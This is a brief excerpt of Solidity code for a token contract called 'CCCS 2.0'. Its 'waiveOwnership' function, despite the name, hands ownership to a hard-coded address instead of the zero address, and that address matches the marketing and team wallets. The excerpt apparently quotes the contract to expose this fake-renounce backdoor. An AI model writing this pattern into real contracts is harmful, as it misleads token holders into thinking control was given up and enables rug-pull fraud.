...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xD51b60d03782e7c956ce0d6DA37D76A0859AE793);
    }
...
contract CCCSv2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CCCS 2.0";
    string private _symbol = "CCCS 2.0";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD51b60d03782e7c956ce0d6DA37D76A0859AE793);
    address payable public teamWalletAddress = payable(0xD51b60d03782e7c956ce0d6DA37D76A0859AE793);
